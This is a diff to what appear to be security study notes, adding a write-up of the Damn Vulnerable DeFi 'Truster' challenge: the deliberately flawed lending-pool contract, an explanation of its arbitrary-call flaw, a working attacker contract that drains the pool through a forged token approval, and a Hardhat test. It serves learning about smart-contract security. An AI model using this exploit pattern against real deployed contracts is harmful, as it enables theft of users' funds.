@@ -111,7 +111,136 @@ describe(NAME, function () {
         });
     });
 });
-``
+```
+
+## Damn Vulnerable DeFi - Truster
+
+### Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/utils/Address.sol";
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+import "../DamnValuableToken.sol";
+
+/**
+ * @title TrusterLenderPool
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract TrusterLenderPool is ReentrancyGuard {
+    using Address for address;
+
+    DamnValuableToken public immutable token;
+
+    error RepayFailed();
+
+    constructor(DamnValuableToken _token) {
+        token = _token;
+    }
+
+    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
+        external
+        nonReentrant
+        returns (bool)
+    {
+        uint256 balanceBefore = token.balanceOf(address(this));
+
+        token.transfer(borrower, amount);
+        target.functionCall(data);
+
+        if (token.balanceOf(address(this)) < balanceBefore) {
+            revert RepayFailed();
+        }
+
+        return true;
+    }
+}
+```
+
+### Exploit
+
+To solve this challenge, note that `flashLoan` allows for arbitrary function calls on the `target` contract. In other words, by calling `flashLoan`, we can make arbitrary function calls on the `TrusterLenderPool` contract's behalf.
+
+In particular, we can approve an attacker contract for the entire pool balance of DVT tokens! (Notice that we need to specify `amount = 0` when calling `flashLoan` for this to work. Otherwise, we'll trigger the `RepayFailed()` error.)
+
+Once `TrusterLenderPool` has approved us to transfer funds on its behalf, we can use `transferFrom` to drain the entire pool.
+
+_TrusterAttacker.sol_
+```solidity
+// SPDX-License-Identifier: UNLICENSE
+pragma solidity ^0.8.0;
+
+import "../DamnValuableToken.sol";
+import "./TrusterLenderPool.sol";
+
+contract TrusterAttacker {
+    DamnValuableToken public immutable token;
+    TrusterLenderPool public immutable pool;
+
+    constructor(DamnValuableToken _token, TrusterLenderPool _pool) {
+        token = _token;
+        pool = _pool;
+    }
+
+    function attack() external {
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 1_000_000 ether);
+        pool.flashLoan(0, address(this), address(token), data);
+        token.transferFrom(address(pool), msg.sender, 1_000_000 ether);
+    }
+}
+```
+
+_truster.challenge.js_
+```javascript
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
+
+describe("[Challenge] Truster", function () {
+  let deployer, player;
+  let token, pool;
+
+  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;
+
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, player] = await ethers.getSigners();
+
+    token = await (
+      await ethers.getContractFactory("DamnValuableToken", deployer)
+    ).deploy();
+    pool = await (
+      await ethers.getContractFactory("TrusterLenderPool", deployer)
+    ).deploy(token.address);
+    expect(await pool.token()).to.eq(token.address);
+
+    await token.transfer(pool.address, TOKENS_IN_POOL);
+    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
+
+    expect(await token.balanceOf(player.address)).to.equal(0);
+  });
+
+  it("Execution", async function () {
+    /** CODE YOUR SOLUTION HERE */
+    attacker = await (
+      await ethers.getContractFactory("TrusterAttacker", deployer)
+    ).deploy(token.address, pool.address);
+
+    await attacker.connect(player).attack();
+  });
+
+  after(async function () {
+    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+    // Player has taken all tokens from the pool
+    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
+    expect(await token.balanceOf(pool.address)).to.equal(0);
+  });
+});
+```
+
 
 # Security - Week 2
 
